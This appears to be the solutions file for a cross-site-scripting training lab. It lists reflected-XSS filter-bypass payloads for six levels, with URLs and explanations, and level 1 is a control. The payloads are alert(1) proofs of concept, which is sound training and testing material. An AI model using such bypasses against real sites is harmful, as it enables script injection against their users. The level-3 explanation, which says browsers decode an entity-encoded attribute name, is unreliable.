# mutfilter — solutions

Reflections with mutation/regex filters that can be bypassed.

### mutfilter-level1

`/mutfilter/level1/?query=%25%33%43img%20src=x%20onerror=alert(1)%25%33%45`

- payload: `no payload — control`
- context: `<`/`>` are replaced with the literal text `%3C`/`%3E` and nothing
  decodes them client-side — served output is the visible string
  `%3Cimg src=x onerror=alert(1)%3E`, so no tag can form. There is no
  double-decoding sink to walk the encoding back through. A true negative.

### mutfilter-level2

`/mutfilter/level2/?query=%3Cscr%3C!--%20--%3Eipt%3Ealert(1)%3C/script%3E`

- payload: `<scr<!-- -->ipt>alert(1)</script>`
- context: HTML comments stripped — used to break script keyword

### mutfilter-level3

`/mutfilter/level3/?query=%3Cimg%20src=x%20&#x6f;nerror=alert(1)%3E`

- payload: `<img src=x &#x6f;nerror=alert(1)>`
- context: `\bon\w` stripped from raw text; HTML-entity-encode the `o` so filter doesn't match, browser decodes

### mutfilter-level4

`/mutfilter/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only src/href/action stripped; plain script tag unaffected

### mutfilter-level5

`/mutfilter/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: no filter, raw reflection in `<p>`

### mutfilter-level6

`/mutfilter/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: whitespace stripped — script tag has none
